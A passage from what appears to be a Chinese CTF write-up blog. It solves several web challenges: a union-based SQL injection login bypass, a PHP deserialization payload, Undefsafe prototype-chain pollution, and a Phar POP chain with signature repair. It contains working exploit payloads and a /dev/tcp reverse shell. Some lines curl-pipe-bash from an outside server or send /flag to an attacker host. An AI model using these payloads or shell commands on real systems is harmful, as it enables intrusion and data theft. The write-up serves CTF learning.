class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> echo <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;<br>die(<span class="hljs-string">&quot;do not hack me!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;<br>printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-regexp">//</span> echo <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br><span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<br><span class="hljs-regexp">//</span> print_r(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br><span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;<br>echo <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>die(<span class="hljs-string">&quot;wrong pass!&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>die(<span class="hljs-string">&quot;wrong user!&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里发现成功登录就会输出flag，同时这里可以利用我们select出来的“123”<code>$arr = mysqli_fetch_row($result);</code></p><p>然后就是这一题的重难点：<strong>联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据</strong></p><p>我们本地尝试一下</p><p>先创建几个数据</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102207781.png" alt="image-20250410220746683"></p><p>此时一查就可以构造一条虚假用户</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102208344.png" alt="image-20250410220850239"></p><p>但是如果你再次刷新该库，数据并没有保存。（我认为这就是大佬们说的构造虚拟的数据，如有错误，欢迎指正）</p><p>注意上面代码的逻辑，我们此时完全可以修改select出来的“1，2，3”，达到类似<code>&#39; union select 1,&#39;admin&#39;,&#39;matrix&#39;</code>的效果，使其能够满足<code>if($arr[1] == &quot;admin&quot;)&#123;if(md5($password) == $arr[2])&#123;</code></p><p>我们先MD5加密一下matrix</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">21B72C0B7ADC5C7B4A50FFCB90D92DD6<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219346.png" alt="image-20250410221922238"></p><p><code>&#39; union select 1,&#39;admin&#39;,&#39;21b72c0b7adc5c7b4a50ffcb90d92dd6&#39;#</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219700.png" alt="image-20250410221904453"></p><p>得到flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219093.png" alt="image-20250410221950823"></p><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>我们直接看最后，这种题我们一定是要反序列化的，所以要过了<code>is_valid</code> 函数，</p><p>这一函数检查字符串中的每个字符是否在 ASCII 码的 32 到 125 之间，</p><p>只要是之间就可以</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172135777.png" alt="image-20250217213527736"></p><p>然后我们接着看代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172139618.png" alt="image-20250217213900559"></p><p>发现析构函数<code>__destruct()</code>，然后我们再看<code>process()</code>，发现我们要执行<code>read()</code>才能得到flag</p><p>那这里就要求我们<code>op==2</code>，且<code>op</code>不能<code>===2</code>，可以用数字<code>2</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172142000.png" alt="image-20250217214238906"></p><p>这里我们直接解码后，有不可见字符</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172200665.png" alt="image-20250217220053614"></p><p>原来是类修饰符的问题</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172203504.png" alt="image-20250217220331463"></p><p>修改成public（竟然可以直接修改类修饰符，长见识了）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172205493.png" alt="image-20250217220555437"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>FileHandler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>op%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>filename%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>.%<span class="hljs-number">2</span>Fflag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>content%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Hello+World%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172205629.png" alt="image-20250217220508586"></p><h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><p>给了源码，这一题考察的是<strong>Undefsafe模块原型链污染</strong>。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202035758.png" alt="image-20250220203453664"></p><p>Undefsafe 是 Nodejs 的一个第三方模块，其核心是一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt;  2.0.3版本）中存在原型链污染漏洞（CVE-2019-10795），攻击者可利用该漏洞添加或修改 Object.prototype 属性。</p><p>这里我们知道了除merge函数之外的可以导致原型链污染的函数</p><p>除此之外，<strong>Lodash模块也可以导致原型链污染</strong>，这里提一下lodash中常见的导致原型链污染的方法：</p><ol><li>lodash.defaultsDeep方法</li><li>lodash.merge 方法</li><li>lodash.mergeWith 方法</li><li>lodash.set 方法</li><li>lodash.setWith 方法</li></ol><p>言归正传，下面是Undefsafe 导致原型链污染的一个例子</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> a = require(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)    <span class="hljs-comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="hljs-comment">// this is [object Object]</span><br>a(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;just a evil!&#x27;</span>&#125;)<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)    <span class="hljs-comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="hljs-comment">// this is just a evil!</span><br><br></code></pre></td></tr></table></figure><p>我们先看源码，</p><p>先用语法糖写了个类<code>Notes</code>，我们需要注意<code>Notes</code>类的两个成员方法<code>get_note</code>与<code>edit_note</code>，这两个成员方法都用到了<code>undefsafe</code>函数，一会从这两个成员方法入手，进行原型链污染</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202041756.png" alt="image-20250220204108557"></p><p>然后写了几个路由<code>/&#39;、&#39;/add_note&#39;、&#39;/edit_note&#39;、&#39;/delete_note&#39;、&#39;/notes&#39;、&#39;/status&#39;</code>，</p><p>用deepseek的话说，这段代码实现了一个基于 <strong>Express</strong> 框架的简单笔记应用，使用 <strong>Pug</strong> 作为模板引擎。用户可以添加、编辑、删除和查看笔记，同时还有一个 <code>/status</code> 路由用于执行系统命令并返回状态信息。</p><p>要注意<code>&#39;/edit_note&#39;</code>路由，其中用到了<code>edit_note</code>这一成员方法，而且三个参数都是我们可控的（而<code>&#39;/notes&#39;</code>中的<code>get_note</code>的参数并不是完全可控，因此不能利用）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202049527.png" alt="image-20250220204942483"></p><p>通过上面的<code>&#39;/edit_note&#39;</code>路由，我们可以进行原型链污染，但原型链污染了之后怎么利用？</p><p>这时候就要看<code>&#39;/status&#39;</code>路由，它会将commands字典的所有的值进行命令执行</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202054474.png" alt="image-20250220205424428"></p><p>而且这个 for (let index in commands) 不只是遍历 commands 表，还会去回溯遍历原型链上的属性</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202057536.png" alt="image-20250220205716490"></p><p>所以我们的思路就清楚了</p><p>我们先在<code>&#39;/edit_note&#39;</code>路由污染原型链的属性，然后在<code>/status</code>处遍历原型链中我们污染的属性去执行恶意代码</p><p>下面我们需要用到公网IP，尽量搞一个云服务器或者vps</p><p>这里我想的是反弹shell，所以先写一个反弹shell的一句话木马</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/公网IP/nc端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202104824.png" alt="image-20250220210436784"></p><p>然后我们在刚刚一句话木马的目录下启动Python 3 中HTTP 服务器，并将其监听在端口 80 上（我这里是监听在80端口，大家可以根据自己的 安全组策略 去安排）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202114458.png" alt="image-20250220211420416"></p><p>这时我们再写payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span>=__proto__.cmd&amp;author=curl http://公网IP:80/shell.txt|bash&amp;raw=matrix<br></code></pre></td></tr></table></figure><p>注意先开nc监听（这里的端口要与一句话木马中的nc端口一样，不要和python服务的端口搞混了），初学者要搞清楚这俩端口的区别，分别代表着不同的服务（一个是python的HTTP服务，一个用来接受反弹shell）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>然后用hackbar去POST传递payload</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202115467.png" alt="image-20250220211511264"></p><p>接受反弹shell后找一找目录，在<code>/flag</code>里找到flag</p><p>也可以不反弹shell，下面的payload应该可行（实际比赛似乎做不到，怎么知道flag在哪个目录呢？）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/edit_note<br><br><span class="hljs-comment"># post提交</span><br><span class="hljs-attribute">id</span>=__proto__.bb&amp;author=curl -F <span class="hljs-string">&#x27;flag=@/flag&#x27;</span> 公网IP:nc端口&amp;<span class="hljs-attribute">raw</span>=a<br><br><span class="hljs-comment"># nc监听端口</span><br>nc -lvp 8080<br><br>访问/status<br></code></pre></td></tr></table></figure><h1 id="Dest0g3-520迎新赛-PharPOP"><a href="#Dest0g3-520迎新赛-PharPOP" class="headerlink" title="[Dest0g3 520迎新赛]PharPOP"></a>[Dest0g3 520迎新赛]PharPOP</h1><p>之前做过phar的题，但没想到可以这样考</p><p>按照我的理解，phar之于php，就如jar之于java</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503041425216.png" alt="image-20250220231750162"></p><p>manifest 压缩文件的属性等信息，以序列化存储；调用phar:&#x2F;&#x2F;伪协议，可读取 .phar文件，而且Phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化。</p><p>注意：Phar需要PHP &gt;&#x3D; 5.2 ，而且在php.init中将phar.readonly设为Off。</p><p>我们先读一下源代码，</p><p>代码里写了几个类，还有一个waf函数过滤类名，</p><p>最后是一个长度判断，规定了<code>$_POST[1])</code>长度小于55，小于55我们肯定不能在这构造pop链了，但是我们可以利用类D中的<code>$_POST[0]</code>构造pop链</p><p><strong>然后大体的思路我们已经明白了：<code>$_POST[0]</code>构造phar文件，其中写有pop链；而<code>$_POST[1])</code>则写有序列化后的类D的对象，以此来操纵phar文件的写入读取。</strong></p><p>但是这里依然有三个问题：</p><ol><li>如何构造pop链去找到并读出flag？</li><li>源码末尾的<code>throw new Error(&quot;start&quot;);</code>会导致程序抛出异常，无法利用程序正常的结束来触发<code>__destruct</code>，如何绕过？</li><li>如何绕过waf函数？</li></ol><p>我们逐步解决这三个问题，</p><p>第一步，构造pop链，</p><p>利用点在air类的<code>echo new $p($value);</code>，可以想办法控制类名和参数，利用PHP原生类进行目录遍历或者文件读取（详见<a href="https://www.extrader.top/posts/35c0085d/%EF%BC%89">https://www.extrader.top/posts/35c0085d/）</a></p><p>在PHP原生类中，可遍历目录类有以下几个：</p><ul><li>DirectoryIterator 类</li><li>FilesystemIterator 类</li><li>GlobIterator 类</li></ul><p>以DirectoryIterator 类为例，我们可以配合glob:&#x2F;&#x2F;协议使用模式匹配来寻找我们想要的文件路径（详见<a href="https://php.golaravel.com/wrappers.glob.html%EF%BC%89">https://php.golaravel.com/wrappers.glob.html）</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*f*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><p>其他遍历目录类同理，然后可读取文件类有：</p><ul><li>SplFileObject 类</li></ul><p>我们可以像类似下面这样去读取一个文件的一行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br><br></code></pre></td></tr></table></figure><p>综合一下，构造pop链，并形成phar文件</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">air</span></span>&#123;<br>    public <span class="hljs-variable">$p</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tree</span></span>&#123;<br>    public <span class="hljs-variable">$name</span>;<br>    public <span class="hljs-variable">$act</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">apple</span> </span>&#123;<br>    public <span class="hljs-variable">$xxx</span>;<br>    public <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = new tree;<br><span class="hljs-variable">$b</span> = new apple;<br><span class="hljs-variable">$c</span> = new air;<br><span class="hljs-variable">$d</span> = new tree;<br><br><span class="hljs-regexp">//</span> <span class="hljs-variable">$d</span>-&gt;act=<span class="hljs-string">&#x27;FilesystemIterator&#x27;</span>;<br><span class="hljs-regexp">//</span> <span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$d</span>;<br><span class="hljs-regexp">//</span> <span class="hljs-variable">$b</span>-&gt;xxx = <span class="hljs-variable">$c</span>;<br><span class="hljs-regexp">//</span> <span class="hljs-variable">$b</span>-&gt;flag = <span class="hljs-string">&#x27;glob:///*f*&#x27;</span>;<br><span class="hljs-regexp">//</span> <span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><br><span class="hljs-regexp">//</span><span class="hljs-variable">$d</span>-&gt;act=<span class="hljs-string">&#x27;SplFileObject&#x27;</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$d</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$b</span>-&gt;xxx = <span class="hljs-variable">$c</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$b</span>-&gt;flag = <span class="hljs-string">&quot;/fflaggg&quot;</span>;<br><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><br><span class="hljs-variable">@unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);   <span class="hljs-regexp">//</span>删除之前的test.par文件(如果有)<br><span class="hljs-variable">$phar</span> = new Phar(<span class="hljs-string">&quot;test.phar&quot;</span>); <span class="hljs-regexp">//</span>后缀名必须为phar<br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-regexp">//</span>设置stub<br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>); <span class="hljs-regexp">//</span>将自定义的meta-data存入manifest<br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-regexp">//</span>添加要压缩的文件,随便新建一个文件内容随意<br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p>第二步，绕过<code>throw</code>，</p><p>throw会阻碍析构函数进行，通过gc垃圾回收机制提前触发析构函数，</p><p>所以需要修改Metadata来绕过抛出异常，</p><p>用D这个读写类来举例，如果正常传入数据是无法触发<code>__destruct</code>的，我们可以去掉末尾的大括号，这样会在反序列化时报错触发<code>__destruct</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">修改前：<span class="hljs-attribute">1</span>=O:1:&quot;D&quot;:1:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:1:<span class="hljs-string">&quot;w&quot;</span>;&#125;&amp;<span class="hljs-attribute">0</span>=123<br>修改后：<span class="hljs-attribute">1</span>=O:1:&quot;D&quot;:1:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:1:<span class="hljs-string">&quot;w&quot;</span>;&amp;<span class="hljs-attribute">0</span>=123<br></code></pre></td></tr></table></figure><p>或者传入序列化的数组，再将长度改的不匹配</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">修改前：<span class="hljs-attribute">1</span>=a:2:&#123;i:0;O:1:<span class="hljs-string">&quot;D&quot;</span>:1:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:1:<span class="hljs-string">&quot;w&quot;</span>;&#125;i:1;s:1:<span class="hljs-string">&quot;1&quot;</span>;&#125;&amp;<span class="hljs-attribute">0</span>=123<br>修改后：<span class="hljs-attribute">1</span>=a:2:&#123;i:0;O:1:<span class="hljs-string">&quot;D&quot;</span>:1:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:1:<span class="hljs-string">&quot;w&quot;</span>;&#125;i:1;s:0:<span class="hljs-string">&quot;1&quot;</span>;&#125;&amp;<span class="hljs-attribute">0</span>=123<br></code></pre></td></tr></table></figure><p>这里采用第一种方法，我们用010editor删除最后的大括号，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">改为<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;tree&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;apple&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;xxx&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;air&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;tree&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;act&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>;&#125;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;/fflaggg&quot;</span>;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;act&quot;</span>;N;<br></code></pre></td></tr></table></figure><p>但是这会导致原本的phar签名匹配不上，需要手动修复一下phar的签名</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-built_in">read</span>() <span class="hljs-comment"># 修改内容后的phar文件</span><br>s = f[:<span class="hljs-number">-28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[<span class="hljs-number">-8</span>:] <span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>newf = s+sha1(s).digest()+h <span class="hljs-comment"># 数据 + 签名 + 类型 + GBMB</span><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fixed_test.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).<span class="hljs-built_in">write</span>(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure><p>第三步，绕过waf</p><p>waf中含有各种类名，我们可以把phar进行压缩，这样可以绕过限制</p><p><a href="https://guokeya.github.io/post/uxwHLckwx/">https://guokeya.github.io/post/uxwHLckwx/</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032334787.png" alt="image-20250303233444690"></p><p>然后以url编码形式输出文件内容</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import urllib.parse<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;fixed_test.phar.gz&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.<span class="hljs-built_in">read</span>()<br>    ff = urllib.parse.<span class="hljs-literal">quote</span>(f)  <span class="hljs-comment"># 获取信息</span><br>    print(ff)<br></code></pre></td></tr></table></figure><p>输出后构造payload，</p><p>写入phar文件</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%8</span>B<span class="hljs-variable">%08</span><span class="hljs-variable">%08</span><span class="hljs-variable">%F1</span><span class="hljs-variable">%CB</span><span class="hljs-variable">%C5g</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span>fixed_test.phar<span class="hljs-variable">%00</span>s<span class="hljs-variable">%F7t</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%B0L</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%B1</span>/<span class="hljs-variable">%C8</span><span class="hljs-variable">%28</span>P<span class="hljs-variable">%88</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%F7p</span><span class="hljs-variable">%F4</span><span class="hljs-variable">%09</span><span class="hljs-variable">%89</span>w<span class="hljs-variable">%F6</span><span class="hljs-variable">%F7</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%F0</span><span class="hljs-variable">%F4q</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%D2</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%B4V</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%E5z</span><span class="hljs-variable">%C5</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%08</span><span class="hljs-variable">%C4</span><span class="hljs-variable">%82</span>P<span class="hljs-variable">%9</span>A<span class="hljs-variable">%81</span>a<span class="hljs-variable">%0</span>B<span class="hljs-variable">%10</span><span class="hljs-variable">%FB</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%99</span>X<span class="hljs-variable">%29</span><span class="hljs-variable">%95</span><span class="hljs-variable">%14</span><span class="hljs-variable">%A5</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%2</span>AY<span class="hljs-variable">%19</span>YU<span class="hljs-variable">%17</span><span class="hljs-variable">%83</span>xy<span class="hljs-variable">%89</span><span class="hljs-variable">%B9</span><span class="hljs-variable">%A9J</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%FEV</span><span class="hljs-variable">%A6VJ</span><span class="hljs-variable">%89</span><span class="hljs-variable">%05</span><span class="hljs-variable">%0590</span><span class="hljs-variable">%19</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%A5</span><span class="hljs-variable">%8</span>A<span class="hljs-variable">%8</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%90</span><span class="hljs-variable">%04</span><span class="hljs-variable">%90</span><span class="hljs-variable">%95</span><span class="hljs-variable">%98</span>Y<span class="hljs-variable">%A4de</span><span class="hljs-variable">%08</span><span class="hljs-variable">%126</span><span class="hljs-variable">%B4R</span><span 